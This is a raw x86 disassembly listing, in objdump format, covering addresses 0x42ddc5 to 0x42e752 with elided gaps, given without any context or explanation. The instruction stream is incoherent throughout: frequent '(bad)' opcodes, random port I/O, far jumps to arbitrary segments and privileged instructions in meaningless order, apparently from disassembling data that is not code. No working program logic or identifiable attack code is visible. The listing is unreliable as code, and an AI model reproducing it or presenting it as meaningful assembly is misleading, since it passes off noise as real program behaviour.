  42ddc5:	mov    ebp,0x14376a0b
  42ddca:	pop    ss
  42ddcb:	in     al,dx
  42ddcc:	call   0x4b89:0xcbd0b3cd
  42ddd3:	jb     0x42de3e
  42ddd5:	and    al,0x7b
  42ddd7:	shr    cl,0xa1
  42ddda:	out    dx,eax
  42dddb:	jae    0x42ddd5
  42dddd:	ds dec ecx
  42dddf:	ss pusha 
  42dde1:	ror    DWORD PTR [edi-0x3dc1ae22],cl
  42dde7:	mov    ebx,ds
  42dde9:	loop   0x42ddc2
  42ddeb:	out    0x68,eax
  42dded:	and    al,0x80
  42ddef:	cmp    ch,cl
  42ddf1:	jns    0x42ddfb
  42ddf3:	aas    
  42ddf4:	fwait
  42ddf5:	mov    ebp,0xa655615c
  42ddfa:	ret    0x701b
  42ddfd:	inc    ebx
  42ddfe:	imul   eax,DWORD PTR [bp+si+0xa],0xdaee54cf
  42de06:	mov    bl,0x9
  42de08:	int3   
  42de09:	enter  0xf886,0xba
  42de0d:	and    esi,DWORD PTR [edx+0x7638928a]
  42de13:	xor    ah,ah
  42de15:	cwde   
  42de16:	or     cl,BYTE PTR [eax]
  42de18:	cmp    al,0x3d
  42de1a:	pop    eax
  42de1b:	aad    0xf1
  42de1d:	jl     0x42de86
  42de1f:	push   esp
  42de20:	mov    cl,0x23
  42de22:	dec    esp
  42de23:	aad    0x28
  42de25:	and    al,0xa6
  42de27:	sbb    DWORD PTR es:[edx-0x38],edi
  42de2b:	sbb    eax,0xf335eb62
  42de30:	mov    es,WORD PTR [ecx]
  42de32:	jg     0x42de61
  42de34:	sub    eax,0x6f543f01
  42de39:	test   BYTE PTR [ecx+ebp*8],al
  42de3c:	call   0xf3aac33d
  42de41:	lods   al,BYTE PTR ds:[esi]
  42de42:	daa    
  42de43:	cmp    BYTE PTR [edx],dl
  42de45:	pop    esi
  42de46:	pop    esp
  42de47:	cld    
  42de48:	sti    
  42de49:	ret    0x6801
  42de4c:	xor    al,0x79
  42de4e:	sbb    BYTE PTR [eax+0x6f],0x6c
  42de52:	pop    ebx
  42de53:	stos   BYTE PTR es:[edi],al
  42de54:	add    DWORD PTR [ebx+0x29],eax
  42de57:	mov    dh,BYTE PTR [eax]
  42de59:	cwde   
  42de5a:	mov    ah,0xe0
  42de5c:	inc    esi
  42de5d:	les    esi,FWORD PTR [ecx]
  42de5f:	mul    DWORD PTR [edx]
  42de61:	(bad)  
  42de62:	stos   BYTE PTR es:[edi],al
  42de63:	cli    
  42de64:	and    eax,0x229a3cee
  42de69:	mov    edx,0x7a5705
	...
  42ded6:	out    0x82,al
  42ded8:	lods   eax,DWORD PTR ds:[esi]
  42ded9:	xor    ebp,ebp
  42dedb:	aas    
  42dedc:	(bad)  
  42dedd:	xlat   BYTE PTR ds:[ebx]
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	int3   
  42dee3:	sub    ah,BYTE PTR [edx+0x1eb52c0]
  42dee9:	add    bh,bh
  42deeb:	add    BYTE PTR [eax],al
  42deed:	add    BYTE PTR [edx],bl
  42deef:	xchg   esi,eax
  42def0:	mov    ds:0xb79000a6,al
  42def5:	xor    DWORD PTR [eax],0x51
  42def8:	sub    al,BYTE PTR [edx]
  42defa:	mov    WORD PTR [edi+0x4aaa0cd7],gs
  42df00:	pusha  
  42df01:	stos   DWORD PTR es:[edi],eax
  42df02:	adc    eax,0x926db74b
  42df07:	adc    DWORD PTR [eax+eax*4-0x519bf98c],edi
  42df0e:	pop    ss
  42df0f:	int3   
  42df10:	ficom  DWORD PTR [edi-0x3854e9a4]
  42df16:	cmc    
  42df17:	add    eax,0xdf7eecf8
  42df1c:	scas   al,BYTE PTR es:[edi]
  42df1d:	cli    
  42df1e:	or     dh,BYTE PTR [ecx]
  42df20:	mov    ecx,0xfe243f07
  42df25:	dec    ecx
  42df26:	add    BYTE PTR [edi-0x13],0xd8
  42df2a:	(bad)  
  42df2b:	sbb    al,0xc8
  42df2d:	add    bh,ch
  42df2f:	pushf  
  42df30:	and    cl,al
  42df32:	std    
  42df33:	ss (bad) 
  42df36:	xor    BYTE PTR [ebx-0x4d],ah
  42df39:	jg     0x42df69
  42df3b:	arpl   WORD PTR [ebp+0x385b5f5d],bx
  42df41:	adc    BYTE PTR [ebp-0x74ff2856],ah
  42df47:	inc    ebx
  42df48:	ins    BYTE PTR es:[edi],dx
  42df49:	xor    BYTE PTR ds:0x4e539d23,bl
  42df4f:	stos   BYTE PTR es:[edi],al
  42df50:	test   DWORD PTR [esi+0xfb5a07b],ecx
  42df56:	or     esi,edx
  42df58:	aas    
  42df59:	dec    esp
  42df5a:	mov    ds,WORD PTR [ecx+0xb9fb239]
  42df60:	int3   
  42df61:	ret    
  42df62:	cmp    al,0x68
  42df64:	mov    al,0x6e
  42df66:	adc    eax,0x320aabd6
  42df6b:	jae    0x42df55
  42df6d:	adc    cl,BYTE PTR [edx]
  42df6f:	mov    ah,0x9e
  42df71:	or     BYTE PTR [ebx-0x109b229b],al
  42df77:	out    dx,al
  42df78:	ins    DWORD PTR es:[edi],dx
  42df79:	push   0xffffffc1
  42df7b:	or     al,0xfe
  42df7d:	jne    0x42df7e
  42df7f:	std    
  42df80:	xor    BYTE PTR [ebp+0x42f4e6e6],al
  42df86:	mul    DWORD PTR [esi]
  42df88:	lock pop edx
  42df8a:	aam    0xcc
  42df8c:	(bad)  
  42df8e:	fs iret 
  42df90:	adc    al,0x83
  42df92:	lahf   
  42df93:	jbe    0x42e002
  42df95:	xor    al,0x8c
  42df97:	mov    WORD PTR [ecx-0x7fe6ee00],?
  42df9d:	push   ebx
  42df9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df9f:	retf   
  42dfa0:	cmp    BYTE PTR [ecx+0x1159981a],al
  42dfa6:	push   esp
  42dfa7:	retf   0x40da
  42dfaa:	leave  
  42dfab:	in     al,dx
  42dfac:	mov    ds:0x602b9885,eax
  42dfb1:	mov    al,ds:0xd3b526be
  42dfb6:	sbb    dh,BYTE PTR [edi]
  42dfb8:	push   esp
  42dfb9:	sbb    eax,0x5fd02271
  42dfbe:	clc    
  42dfbf:	dec    esi
  42dfc0:	int3   
  42dfc1:	aad    0x9e
  42dfc3:	inc    edx
  42dfc4:	fstp   DWORD PTR [edx+0x65e744f2]
  42dfca:	sbb    ch,ch
  42dfcc:	fst    QWORD PTR [edi]
  42dfce:	adc    edx,ebp
  42dfd0:	scas   eax,DWORD PTR es:[edi]
  42dfd1:	sub    eax,0x5cadbfac
  42dfd6:	sbb    DWORD PTR [edx],esi
  42dfd8:	or     eax,0xb7456c7
  42dfdd:	mov    gs,ecx
  42dfdf:	push   eax
  42dfe0:	inc    ecx
  42dfe1:	jo     0x42dfd3
  42dfe3:	js     0x42e033
  42dfe5:	jecxz  0x42dfe9
  42dfe7:	and    BYTE PTR [eax-0x73],0x1
  42dfeb:	ins    DWORD PTR es:[edi],dx
  42dfec:	sub    al,BYTE PTR [eax]
	...
  42e056:	add    bh,dh
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x14]
  42e063:	xor    ch,ah
  42e065:	pop    ds
  42e066:	push   ecx
  42e067:	in     al,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	inc    DWORD PTR [eax]
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	mov    eax,0xac66a636
  42e073:	fisub  DWORD PTR [eax-0x47189b4f]
  42e079:	jmp    0x42e004
  42e07b:	push   es
  42e07c:	push   cs
  42e07d:	mov    bl,0xe0
  42e07f:	inc    BYTE PTR [esp+ebp*8]
  42e082:	jmp    0xf3ed1c28
  42e087:	icebp  
  42e088:	les    ecx,FWORD PTR [eax]
  42e08a:	push   ss
  42e08b:	inc    esi
  42e08c:	xchg   edi,eax
  42e08d:	in     al,0xb
  42e08f:	cmp    eax,0xd77e17c4
  42e094:	inc    ebx
  42e095:	push   cs
  42e096:	(bad)  
  42e098:	pop    esp
  42e099:	out    0x4b,al
  42e09b:	sbb    eax,0x449803e7
  42e0a0:	and    DWORD PTR [ecx-0x3c],edi
  42e0a3:	adc    eax,eax
  42e0a5:	push   ds
  42e0a6:	cld    
  42e0a7:	xchg   esi,eax
  42e0a8:	pop    edx
  42e0a9:	mov    al,ds:0x36181526
  42e0ae:	in     al,0x35
  42e0b0:	cld    
  42e0b1:	ins    DWORD PTR es:[edi],dx
  42e0b2:	loopne 0x42e0a2
  42e0b4:	xor    eax,0x4bbaa88
  42e0b9:	mov    ds:0xd26cc3e7,al
  42e0be:	out    dx,al
  42e0bf:	sub    ecx,0x310d0d9b
  42e0c5:	pusha  
  42e0c6:	xchg   edi,eax
  42e0c7:	sub    eax,0x23cff4e9
  42e0cc:	dec    esi
  42e0cd:	dec    edi
  42e0ce:	xchg   BYTE PTR [edi-0x44b4d58d],dl
  42e0d4:	push   eax
  42e0d5:	test   BYTE PTR [esi-0x3c282db0],bh
  42e0db:	pop    ds
  42e0dc:	lods   al,BYTE PTR ds:[esi]
  42e0dd:	(bad)  
  42e0df:	and    esi,DWORD PTR [edi]
  42e0e1:	ret    
  42e0e2:	jmp    0x8a5b:0x790e602a
  42e0e9:	retf   
  42e0ea:	fldln2 
  42e0ec:	adc    dl,BYTE PTR [eax+0x45]
  42e0ef:	dec    dh
  42e0f1:	clc    
  42e0f2:	or     eax,0x2c3a97f1
  42e0f7:	arpl   WORD PTR [edx+eiz*4],ax
  42e0fa:	(bad)  
  42e0fb:	push   0x64
  42e0fd:	cmp    al,0x53
  42e0ff:	stos   BYTE PTR es:[edi],al
  42e100:	mov    BYTE PTR [ebx+0x12],ch
  42e103:	adc    al,0x2b
  42e105:	dec    esi
  42e106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e107:	adc    esi,esi
  42e109:	add    eax,0xe14987f9
  42e10e:	mov    dh,0x2b
  42e110:	aad    0xda
  42e112:	jg     0x42e0cc
  42e114:	lea    ebp,[eax+0x4f]
  42e117:	test   BYTE PTR [ebx],al
  42e119:	mov    dl,0xc5
  42e11b:	cmp    BYTE PTR ds:0x3a022b8a,dl
  42e121:	cmp    esi,DWORD PTR [ebx]
  42e123:	loop   0x42e0c8
  42e125:	adc    ebx,DWORD PTR [eax]
  42e127:	jno    0x42e16c
  42e129:	std    
  42e12a:	xchg   esp,eax
  42e12b:	in     al,0x2b
  42e12d:	stc    
  42e12e:	mov    WORD PTR [eax+0x7118ee1c],ds
  42e134:	stc    
  42e135:	adc    DWORD PTR [edx+0x5f7bc6d4],eax
  42e13b:	gs in  eax,dx
  42e13d:	jp     0x42e135
  42e13f:	ror    DWORD PTR [edx-0x12],cl
  42e142:	cmp    BYTE PTR [edx],al
  42e144:	add    ebp,eax
  42e146:	in     al,dx
  42e147:	dec    ecx
  42e148:	sub    ch,0x5a
  42e14b:	dec    ebp
  42e14c:	push   es
  42e14d:	dec    cl
  42e14f:	out    0x76,al
  42e151:	push   ebp
  42e152:	(bad)  
  42e153:	and    al,0xcf
  42e155:	xor    BYTE PTR [eax],dh
  42e157:	(bad)  
  42e159:	mov    eax,0x5575531e
  42e15e:	xchg   bh,bh
  42e160:	xor    al,0x61
  42e162:	adc    ebx,edx
  42e164:	in     eax,dx
  42e165:	fcomp  DWORD PTR [ebx+edi*1-0x70]
  42e169:	mov    al,0xe2
  42e16b:	stos   BYTE PTR es:[edi],al
  42e16c:	add    BYTE PTR es:[eax],al
	...
  42e1d3:	add    BYTE PTR [eax],al
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	test   BYTE PTR [ebx-0x12afa696],ch
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	inc    DWORD PTR [eax]
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	mov    ch,0xfb
  42e1f0:	imul   edi,DWORD PTR [edi+edi*2],0xf1f9ad1d
  42e1f7:	inc    esp
  42e1f8:	lock out dx,eax
  42e1fa:	mov    eax,ds:0xae8bc35d
  42e1ff:	cmp    DWORD PTR es:[ebx+eiz*8+0x40],esp
  42e204:	int3   
  42e205:	dec    DWORD PTR [eax+0x69]
  42e208:	xchg   edx,eax
  42e209:	jmp    0xe62f:0x1d3c7537
  42e210:	jnp    0x42e25c
  42e212:	xor    ch,bh
  42e214:	retf   0xec12
  42e217:	aad    0x1f
  42e219:	xor    dl,BYTE PTR [edx-0x3a1eff3b]
  42e21f:	inc    ecx
  42e220:	sub    BYTE PTR [ebx+0x1a],al
  42e223:	mov    ds:0x4bcfaeda,al
  42e228:	cmp    eax,0x4f876f8a
  42e22d:	enter  0xdd59,0xbb
  42e231:	loop   0x42e272
  42e233:	jbe    0x42e21e
  42e235:	ss push ebx
  42e237:	cmp    BYTE PTR [ecx],bh
  42e239:	popa   
  42e23a:	sub    DWORD PTR [ebx-0x7d],ebp
  42e23d:	mov    dh,dl
  42e23f:	aas    
  42e240:	in     al,0x85
  42e242:	xor    BYTE PTR [ebx-0x41],ah
  42e245:	inc    ecx
  42e246:	push   0x6353e7d7
  42e24b:	popf   
  42e24c:	ja     0x42e29a
  42e24e:	adc    BYTE PTR [ebx],ch
  42e250:	imul   BYTE PTR [edi-0x6b]
  42e253:	xchg   edx,eax
  42e254:	sub    DWORD PTR [edx],ebp
  42e256:	xchg   edi,eax
  42e257:	rcl    DWORD PTR [ecx],cl
  42e259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e25a:	jno    0x42e25b
  42e25c:	rcr    BYTE PTR [ebx-0x41],1
  42e25f:	adc    eax,0x51bd9b19
  42e264:	xor    eax,DWORD PTR fs:[ebx-0x4a]
  42e268:	in     al,0x2d
  42e26a:	xchg   ecx,eax
  42e26b:	mov    eax,0xe350e3cb
  42e270:	(bad)  
  42e271:	sub    DWORD PTR [edx],esi
  42e273:	or     dh,al
  42e275:	push   ebx
  42e276:	rol    bh,0xf3
  42e279:	sti    
  42e27a:	test   al,0x59
  42e27c:	jns    0x42e22e
  42e27e:	inc    edx
  42e27f:	jmp    DWORD PTR [ecx+esi*4-0x6]
  42e283:	mov    eax,ds:0x1422422a
  42e288:	aam    0x3d
  42e28a:	add    al,0xa1
  42e28c:	pop    ebx
  42e28d:	test   DWORD PTR [ebp+0x6a11a213],esi
  42e293:	mov    eax,0x6e2b6e6c
  42e298:	push   0xd5fba693
  42e29d:	in     al,dx
  42e29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e29f:	xlat   BYTE PTR ds:[ebx]
  42e2a0:	and    DWORD PTR [ecx-0x1e],edx
  42e2a3:	aad    0x1d
  42e2a5:	lock lahf 
  42e2a7:	mov    dl,0x6
  42e2aa:	push   ecx
  42e2ab:	aam    0xd2
  42e2ad:	test   al,0x79
  42e2af:	jbe    0x42e32a
  42e2b1:	out    dx,eax
  42e2b2:	(bad)  
  42e2b4:	cmp    BYTE PTR [edi],al
  42e2b6:	xor    esi,DWORD PTR [eax-0x5760b591]
  42e2bc:	retf   0xd0f4
  42e2bf:	and    BYTE PTR [edi-0x3fa77bb6],dh
  42e2c5:	leave  
  42e2c6:	jg     0x42e321
  42e2c8:	lahf   
  42e2c9:	popf   
  42e2ca:	cmp    ebp,DWORD PTR [ecx+0x1f]
  42e2cd:	(bad)  
  42e2ce:	mov    edi,0xb2bc4ffd
  42e2d3:	icebp  
  42e2d4:	pop    ss
  42e2d5:	not    BYTE PTR [edi+0x17]
  42e2d8:	and    bl,BYTE PTR [edi+0x1d1bd3a8]
  42e2de:	jne    0x42e326
  42e2e0:	outs   dx,BYTE PTR ds:[esi]
  42e2e1:	loop   0x42e345
  42e2e3:	mov    ah,0xf1
  42e2e5:	outs   dx,DWORD PTR ds:[esi]
  42e2e6:	or     DWORD PTR ds:0x8836448d,esp
  42e2ec:	inc    edx
	...
  42e355:	add    BYTE PTR [ebp-0x655875c3],ch
  42e35b:	mov    bh,0xad
  42e35d:	aas    
  42e35e:	mov    ebx,0xbd199140
  42e363:	outs   dx,DWORD PTR ds:[esi]
  42e364:	mov    DWORD PTR [edx+0x1ee4f],ebx
  42e36a:	inc    DWORD PTR [eax]
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	jno    0x42e387
  42e370:	(bad)  
  42e372:	fmul   DWORD PTR [esi-0xd]
  42e375:	ds jo  0x42e3c7
  42e378:	push   cs
  42e379:	xchg   esp,ebp
  42e37b:	jne    0x42e31d
  42e37d:	retf   
  42e37e:	in     al,dx
  42e37f:	scas   eax,DWORD PTR es:[edi]
  42e380:	dec    ebp
  42e381:	pop    eax
  42e382:	jl     0x42e3d3
  42e384:	enter  0xa814,0x91
  42e388:	fwait
  42e389:	paddq  mm3,QWORD PTR [esi+0x7d]
  42e38d:	je     0x42e3aa
  42e38f:	out    dx,eax
  42e390:	shr    dl,1
  42e392:	je     0x42e382
  42e394:	inc    ebx
  42e395:	call   0xe24b7577
  42e39a:	fisub  DWORD PTR [ebx-0x10ca1c02]
  42e3a0:	jnp    0x42e329
  42e3a2:	push   ss
  42e3a3:	xchg   ebp,eax
  42e3a4:	mov    dh,0xaa
  42e3a6:	cmp    DWORD PTR [ecx+0x3c],esp
  42e3a9:	imul   esi,DWORD PTR [ecx-0x77360041],0x60abf3
  42e3b3:	adc    cl,BYTE PTR [ebp+0x6267bbd]
  42e3b9:	stos   BYTE PTR es:[edi],al
  42e3ba:	test   DWORD PTR [edx+0x7d],esi
  42e3bd:	aam    0xfc
  42e3bf:	jb     0x42e412
  42e3c1:	sbb    BYTE PTR [ecx],al
  42e3c3:	mov    cl,0x3a
  42e3c5:	cmp    ebp,ecx
  42e3c7:	adc    al,0xdd
  42e3c9:	sub    DWORD PTR [ebx-0x5a4b912f],ecx
  42e3cf:	aas    
  42e3d0:	rcr    DWORD PTR [di-0x3b7c],cl
  42e3d5:	sub    BYTE PTR [ebx],dl
  42e3d7:	daa    
  42e3d8:	out    dx,al
  42e3d9:	mov    gs,eax
  42e3db:	mov    cl,0x58
  42e3dd:	leave  
  42e3de:	or     DWORD PTR [esi],ecx
  42e3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3e1:	inc    ebp
  42e3e2:	or     DWORD PTR [ebp+ebp*8+0x72],edi
  42e3e6:	shl    DWORD PTR [ecx],1
  42e3e8:	fidiv  DWORD PTR [edx+0x5a]
  42e3eb:	xor    ch,BYTE PTR [edi-0x5f]
  42e3ee:	scas   al,BYTE PTR es:[edi]
  42e3ef:	test   DWORD PTR [ecx],edx
  42e3f1:	jge    0x42e3f2
  42e3f3:	in     eax,dx
  42e3f4:	retf   
  42e3f5:	mov    edi,eax
  42e3f7:	mov    ah,0xca
  42e3f9:	leave  
  42e3fa:	es inc ebp
  42e3fc:	test   dl,bh
  42e3fe:	shl    DWORD PTR [ebx-0x4e520c12],1
  42e404:	aad    0x3d
  42e406:	xchg   ebx,eax
  42e407:	xchg   esp,esp
  42e409:	pop    ds
  42e40a:	ins    BYTE PTR es:[edi],dx
  42e40b:	sar    cl,0x9e
  42e40e:	lods   al,BYTE PTR ds:[esi]
  42e40f:	lea    ecx,[esi+0x2e1aa5fb]
  42e415:	(bad)
  42e419:	add    eax,0x2b6eebc0
  42e41e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e41f:	jl     0x42e42a
  42e421:	dec    esi
  42e422:	jnp    0x42e472
  42e424:	jae    0x42e3ef
  42e426:	test   DWORD PTR [ebx+0x5eba4f15],esp
  42e42c:	iret   
  42e42d:	push   edi
  42e42e:	aam    0x40
  42e430:	popa   
  42e431:	adc    DWORD PTR [ecx-0x7313b7e1],edi
  42e437:	inc    edi
  42e438:	sub    BYTE PTR [eax+0x39415603],dl
  42e43e:	sbb    BYTE PTR [ebp+esi*1+0x4f],bh
  42e442:	sbb    al,0x9b
  42e444:	xor    ebp,edx
  42e446:	pusha  
  42e447:	rcl    bh,1
  42e449:	retf   
  42e44a:	sub    BYTE PTR [ebx+0x27],bh
  42e44d:	scas   eax,DWORD PTR es:[edi]
  42e44e:	add    dl,BYTE PTR [eax+edi*1+0x51ae3206]
  42e455:	in     eax,0xa7
  42e457:	ss jo  0x42e469
  42e45a:	dec    esp
  42e45b:	outs   dx,BYTE PTR ds:[esi]
  42e45c:	sahf   
  42e45d:	lods   eax,DWORD PTR ds:[esi]
  42e45e:	adc    DWORD PTR [ecx],ecx
  42e460:	je     0x42e410
  42e462:	xchg   edx,eax
  42e463:	ja     0x42e43f
  42e465:	sbb    DWORD PTR [esi-0x2e084e73],eax
  42e46b:	in     eax,dx
  42e46c:	push   edi
	...
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	aad    0xab
  42e4e4:	test   al,0xa4
  42e4e6:	dec    esi
  42e4e7:	out    dx,eax
  42e4e8:	add    DWORD PTR [eax],eax
  42e4ea:	inc    DWORD PTR [eax]
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	or     ah,BYTE PTR [edi+ebx*8]
  42e4f1:	cmp    al,0x74
  42e4f3:	pusha  
  42e4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4f5:	aam    0xbd
  42e4f7:	push   es
  42e4f8:	in     eax,0x9c
  42e4fa:	iret   
  42e4fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4fc:	sbb    ah,al
  42e4fe:	jns    0x42e525
  42e500:	push   ebp
  42e501:	mov    edi,0xda3310a3
  42e506:	ins    BYTE PTR es:[edi],dx
  42e507:	loopne 0x42e508
  42e509:	out    dx,eax
  42e50a:	loope  0x42e564
  42e50c:	lock jne 0x42e4a8
  42e50f:	ret    0xba1d
  42e512:	mov    BYTE PTR [esi],ah
  42e514:	ins    DWORD PTR es:[edi],dx
  42e515:	pop    esi
  42e516:	pop    edi
  42e517:	sar    BYTE PTR [ecx],0x0
  42e51a:	adc    bh,BYTE PTR [ebx]
  42e51c:	add    edi,DWORD PTR [edx+esi*8]
  42e51f:	adc    al,0x61
  42e521:	out    dx,eax
  42e522:	push   ds
  42e523:	(bad)  
  42e524:	js     0x42e590
  42e526:	in     al,0x14
  42e528:	and    BYTE PTR [ebx+0x46],dl
  42e52b:	(bad)  
  42e52c:	cmc    
  42e52d:	dec    edx
  42e52e:	push   ebx
  42e52f:	jg     0x42e4df
  42e531:	rcl    BYTE PTR [ecx-0xfce0a9a],0x72
  42e538:	std    
  42e539:	loope  0x42e581
  42e53b:	arpl   WORD PTR [esi+0x37],sp
  42e53e:	in     eax,dx
  42e53f:	std    
  42e540:	mov    dh,0xa3
  42e542:	aas    
  42e543:	xor    DWORD PTR [eax-0x74501680],0x3cb5a110
  42e54d:	or     edi,DWORD PTR [ecx]
  42e54f:	pop    ebx
  42e550:	pop    ebp
  42e551:	jge    0x42e52f
  42e553:	cwde   
  42e554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e555:	xchg   edx,edx
  42e557:	ins    BYTE PTR es:[edi],dx
  42e558:	(bad)  
  42e559:	aas    
  42e55a:	cld    
  42e55b:	jbe    0x42e5ba
  42e55d:	or     DWORD PTR [edi],ebp
  42e55f:	(bad)  
  42e560:	jo     0x42e56f
  42e562:	jmp    0x6813:0x50850c7
  42e569:	jp     0x42e51e
  42e56b:	sbb    edi,DWORD PTR [edx+0x42]
  42e56e:	xchg   ebp,eax
  42e56f:	or     bh,ah
  42e571:	lods   al,BYTE PTR ds:[esi]
  42e572:	and    dh,BYTE PTR [esi+0x2ad14b94]
  42e578:	and    DWORD PTR cs:[esi+0x17],ebp
  42e57c:	xor    al,0x73
  42e57e:	cmp    dl,bl
  42e580:	xchg   ebp,eax
  42e581:	jne    0x42e5f0
  42e583:	sbb    DWORD PTR [edi+0x64ff933b],edx
  42e589:	repz and bh,bl
  42e58c:	jns    0x42e579
  42e58e:	mov    al,0x27
  42e590:	or     dl,BYTE PTR [edx+0x4c]
  42e593:	dec    ebx
  42e594:	bound  ecx,QWORD PTR [esp+esi*8]
  42e597:	cli    
  42e598:	aam    0x77
  42e59a:	jns    0x42e552
  42e59c:	ins    DWORD PTR es:[edi],dx
  42e59d:	std    
  42e59e:	sbb    ebp,ebp
  42e5a0:	jbe    0x42e576
  42e5a2:	iret   
  42e5a3:	int    0xee
  42e5a5:	mov    eax,ds:0xea380acd
  42e5aa:	mov    bl,0xa9
  42e5ac:	pop    edx
  42e5ad:	mov    BYTE PTR [edx],dh
  42e5af:	fsub   QWORD PTR [eax-0x47]
  42e5b2:	jp     0x42e58d
  42e5b4:	mov    eax,0x9f0f7167
  42e5b9:	xor    BYTE PTR [edx+0x74],al
  42e5bc:	call   0x4f48:0xe50d43e6
  42e5c3:	ja     0x42e5f3
  42e5c5:	lock fcmovbe st,st(5)
  42e5c8:	jge    0x42e579
  42e5ca:	hlt    
  42e5cb:	sub    bl,bh
  42e5cd:	test   eax,0x4cbc4d83
  42e5d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e5d3:	fidiv  DWORD PTR [ebx+0xe]
  42e5d6:	xlat   BYTE PTR ds:[ebx]
  42e5d7:	test   DWORD PTR [esi],ebp
  42e5d9:	in     al,0x19
  42e5db:	or     eax,0x4b20086d
  42e5e0:	or     al,0xa5
  42e5e2:	add    DWORD PTR [eax-0x1577ae29],ebp
  42e5e8:	stos   BYTE PTR es:[edi],al
  42e5e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e5ea:	cmp    eax,0x56a3
	...
  42e653:	add    BYTE PTR [eax],al
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	and    dl,ah
  42e664:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42e666:	dec    ebp
  42e667:	lock add DWORD PTR [eax],eax
  42e66a:	inc    DWORD PTR [eax]
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	sbb    eax,DWORD PTR [ebx+0x624dc91a]
  42e674:	push   es
  42e675:	jle    0x42e69b
  42e677:	mov    edi,0x339304cf
  42e67c:	xchg   ebp,eax
  42e67d:	stos   DWORD PTR es:[edi],eax
  42e67e:	sub    eax,DWORD PTR [eax]
  42e680:	inc    esp
  42e681:	jno    0x42e65b
  42e683:	xor    ebx,DWORD PTR [ebx]
  42e685:	sub    eax,DWORD PTR [ebx]
  42e687:	sub    bl,BYTE PTR [edx+edx*1-0x58]
  42e68b:	cli    
  42e68c:	aad    0xc3
  42e68e:	push   edi
  42e68f:	or     edx,DWORD PTR [edx+0x57]
  42e692:	and    BYTE PTR [edx+0x8c1cd19],cl
  42e698:	pop    es
  42e699:	mov    esp,DWORD PTR [ecx]
  42e69b:	imul   ebp,DWORD PTR [edi],0xe7d6fa86
  42e6a1:	xor    DWORD PTR [ebp+0x4921a88b],0xffffffaa
  42e6a8:	test   DWORD PTR [ebx-0x3edde9cd],eax
  42e6ae:	mov    dh,0x9f
  42e6b0:	call   0x6270:0x154fa74c
  42e6b7:	jmp    0x12c1:0x18bad0aa
  42e6be:	aam    0xf8
  42e6c0:	mov    BYTE PTR [ecx-0x3554fa2c],0x5d
  42e6c7:	out    0xb3,al
  42e6c9:	or     dl,BYTE PTR [ecx]
  42e6cb:	pop    esi
  42e6cc:	dec    esi
  42e6cd:	call   DWORD PTR [eax-0x399d841b]
  42e6d3:	imul   eax,esi,0x70
  42e6d6:	aam    0x6a
  42e6d8:	adc    eax,0xf7c23cb6
  42e6dd:	inc    esi
  42e6de:	rcr    BYTE PTR [ebp+0x11dc4d52],0xb2
  42e6e5:	xchg   esi,eax
  42e6e6:	cmp    DWORD PTR [eax+0x37],0xfffffffa
  42e6ea:	or     ax,0x888c
  42e6ee:	popa   
  42e6ef:	mov    edx,0xf056f2a4
  42e6f4:	push   cs
  42e6f5:	mov    edx,0x86e9a4f2
  42e6fa:	dec    esp
  42e6fb:	xor    ecx,0xffffff85
  42e6fe:	fbld   TBYTE PTR [edx+0x4600f046]
  42e704:	fs dec ebp
  42e706:	dec    ecx
  42e707:	sar    DWORD PTR [ebx],cl
  42e709:	xor    dl,dh
  42e70b:	sub    al,BYTE PTR [edx]
  42e70d:	push   ebp
  42e70e:	scas   eax,DWORD PTR es:[edi]
  42e70f:	les    ebx,FWORD PTR [esi+edi*1+0x20]
  42e713:	jns    0x42e777
  42e715:	inc    eax
  42e716:	cmc    
  42e717:	test   al,0xbf
  42e719:	icebp  
  42e71a:	xor    BYTE PTR [esi+esi*2],cl
  42e71d:	daa    
  42e71e:	std    
  42e71f:	pushf  
  42e720:	loope  0x42e761
  42e722:	mov    al,ds:0x3b6b1a5f
  42e727:	pop    eax
  42e728:	or     al,0x17
  42e72a:	cld    
  42e72b:	pop    ss
  42e72c:	cwde   
  42e72d:	jl     0x42e714
  42e72f:	and    DWORD PTR [ebx-0x6c7eac24],ebp
  42e735:	add    BYTE PTR [edi+ecx*8-0x75],0x9c
  42e73a:	xlat   BYTE PTR ds:[ebx]
  42e73b:	jle    0x42e798
  42e73d:	inc    esi
  42e73e:	xchg   ebx,eax
  42e73f:	repz cmp eax,0x45c8a083
  42e745:	add    DWORD PTR [edx+0x638c89bb],ecx
  42e74b:	ror    DWORD PTR [eax],cl
  42e74d:	cmp    DWORD PTR [eax],0x6a
  42e750:	pop    esi
  42e751:	fwait
  42e752:	push   ebx
